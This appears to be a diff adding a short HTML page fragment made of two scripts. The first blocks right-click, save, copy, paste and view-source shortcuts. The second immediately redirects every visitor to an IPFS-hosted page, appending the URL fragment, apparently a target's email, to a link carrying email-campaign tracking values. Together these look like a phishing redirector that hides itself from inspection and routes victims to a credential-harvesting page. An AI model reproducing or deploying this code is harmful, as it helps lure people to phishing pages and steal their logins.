@@ -1,0 +1,43 @@
+<script>
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+</script>
+
+
+<script type="text/javascript">
+        if(window.location.hash) {
+            var url = window.location.href;
+            var hash = url.split('#').pop();
+
+            window.location.replace("https://ipfs.fleek.co/ipfs/QmaeyMvPxe3dUVFqR25FzMMpWGEaqc41mhy8xCuc7qvRjq/?ioxwrxnaerll&auth=&7589cf-3ac6-4e1c-9e2a-babd0161c3c4&utm_source=benchmarkmail&utm_campaign=&utm_medium=u=589a0449d04476c8af0f92bc7&amp;id=ca92440317&amp;e=c5cec25e50BgVtWAzsQmMcaL3zBjzlZ2TJR&amp#"+hash);
+        } else {
+          window.location.replace("https://ipfs.fleek.co/ipfs/QmaeyMvPxe3dUVFqR25FzMMpWGEaqc41mhy8xCuc7qvRjq/?ioxwrxnaerll&auth=&7589cf-3ac6-4e1c-9e2a-babd0161c3c4&utm_source=benchmarkmail&utm_campaign=&utm_medium=u=589a0449d04476c8af0f92bc7&amp;id=ca92440317&amp;e=c5cec25e50BgVtWAzsQmMcaL3zBjzlZ2TJR&amp#"+hash);
+        }
+
+    </script>
